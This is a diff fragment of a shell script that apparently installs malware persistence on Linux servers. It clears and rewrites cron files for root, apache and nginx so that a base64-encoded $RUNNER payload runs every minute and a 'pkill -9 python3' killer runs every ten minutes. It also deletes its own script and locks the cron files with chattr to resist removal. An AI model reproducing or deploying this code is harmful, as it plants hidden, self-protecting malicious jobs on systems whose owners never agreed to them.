@@ -6,20 +6,26 @@ KILLER=$(echo "pkill -9 python3" | base64)
 chattr -i -a /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1
 chattr -ia $RATPWD/*
 rm -rf /etc/cron.d/root /etc/cron.d/apache /etc/cron.d/nginx /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1
-echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash" | crontab -
-echo -e "*/10 * * * * echo $KILLER | base64 -d | bash" | crontab -
-echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash" > /etc/cron.d/root
-echo -e "*/10 * * * * echo $KILLER | base64 -d | bash" >> /etc/cron.d/root
-echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash" > /etc/cron.d/apache
-echo -e "*/10 * * * * echo $KILLER | base64 -d | bash" >> /etc/cron.d/apache
-echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash" > /etc/cron.d/nginx
-echo -e "*/10 * * * * echo $KILLER | base64 -d | bash" >> /etc/cron.d/nginx
-echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash" > /var/spool/cron/root
-echo -e "*/10 * * * * echo $KILLER | base64 -d | bash" >> /var/spool/cron/root
-echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash" > /var/spool/cron/crontabs/root
-echo -e "*/10 * * * * echo $KILLER | base64 -d | bash" >> /var/spool/cron/crontabs/root
-echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash" > /etc/cron.hourly/oanacroner1
-echo -e "*/10 * * * * echo $KILLER | base64 -d | bash" >> /etc/cron.hourly/oanacroner1
+echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash\n" | crontab -
+echo -e "*/10 * * * * echo $KILLER | base64 -d | bash\n" | crontab -
+echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash\n" > /etc/cron.d/root
+echo -e "*/10 * * * * echo $KILLER | base64 -d | bash\n" >> /etc/cron.d/root
+echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash\n" > /etc/cron.d/apache
+echo -e "*/10 * * * * echo $KILLER | base64 -d | bash\n" >> /etc/cron.d/apache
+echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash\n" > /etc/cron.d/nginx
+echo -e "*/10 * * * * echo $KILLER | base64 -d | bash\n" >> /etc/cron.d/nginx
+echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash\n" > /var/spool/cron/root
+echo -e "*/10 * * * * echo $KILLER | base64 -d | bash\n" >> /var/spool/cron/root
+echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash\n" > /var/spool/cron/crontabs/root
+echo -e "*/10 * * * * echo $KILLER | base64 -d | bash\n" >> /var/spool/cron/crontabs/root
+echo -e "*/1 * * * *  echo $RUNNER | base64 -d | bash\n" > /etc/cron.hourly/oanacroner1
+echo -e  "*/10 * * * * echo $KILLER | base64 -d | bash\n" >> /etc/cron.hourly/oanacroner1
+mv /etc/cron.d/*root* /etc/cron.d/root
+mv /etc/cron.d/*apache* /etc/cron.d/apache
+mv /etc/cron.d/*nginx* /etc/cron.d/nginx
+mv /var/spool/cron/*root* /var/spool/cron/root
+mv /var/spool/cron/crontabs/*root* /var/spool/cron/crontabs/root
+mv /etc/cron.hourly/*oanacroner1* /etc/cron.hourly/oanacroner1
 rm -rf $PWD/cron.sh
 chattr +ai -V /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1 
 chattr +ia $RATPWD/*
